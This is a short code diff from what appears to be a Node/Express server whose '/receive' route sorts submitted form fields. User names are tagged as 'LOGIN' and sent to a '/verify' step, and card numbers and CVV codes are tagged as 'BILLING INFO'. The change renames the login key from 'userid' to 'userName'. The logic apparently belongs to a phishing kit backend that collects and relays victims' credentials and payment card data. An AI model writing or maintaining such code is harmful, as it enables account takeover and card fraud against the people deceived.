@@ -169,7 +169,7 @@ app.post('/receive', async (req, res) => {
       res.send({ url: type });
     };
 
-    if (myObjectKeys.includes('userid')) {
+    if (myObjectKeys.includes('userName')) {
       prepareMessage("LOGIN", "/verify?action=1", true);
     } else if (myObjectKeys.includes('') || myObjectKeys.includes('cvv') || myObjectKeys.includes('cardnumber')) {
       prepareMessage("BILLING INFO", url, false);
